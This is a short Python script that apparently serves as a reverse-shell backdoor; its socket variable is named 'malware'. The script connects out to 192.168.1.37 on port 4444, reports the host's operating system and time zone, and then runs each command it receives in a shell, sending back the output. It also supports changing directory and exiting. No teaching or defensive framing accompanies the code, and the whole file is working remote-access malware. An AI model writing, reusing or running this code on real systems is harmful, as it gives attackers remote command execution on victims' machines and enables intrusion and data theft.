import socket
import pyautogui
import os
import subprocess
import platform
import datetime

def send_command():
    sys_os = platform.system()
    malware.send(sys_os.encode())
    time_zone = str(datetime.datetime.now().astimezone().tzinfo) + " - " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    malware.send(time_zone.encode())

def change_fold(path):
    try:
        os.chdir(path)
        return "[+] Change a {}".format(os.getcwd())
    except Exception as e:
        return str(e).encode()

def exe_recv(msg_recv):
    try:
        res = subprocess.run(msg_recv, shell=True, text=True, capture_output=True)
        output = res.stdout
        malware.send(output.encode())
    except Exception as e:
        print(f"Error execute command: {e}")

if __name__ == '__main__':
    try:
        malware = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        malware.connect(('192.168.1.37', 4444))
        send_command()
        while True:
            msg_recv = malware.recv(1024).decode()
            if msg_recv == 'exit':
                malware.close()
                break
            elif msg_recv.startswith('cd'):
                msg = change_fold(msg_recv[3:])
                malware.send(msg.encode())
            else:
                exe_recv(msg_recv)
    except Exception as e:
        print('Error: ',e)
    except KeyboardInterrupt as k:
        print('KeyboardInterrupt: ',k)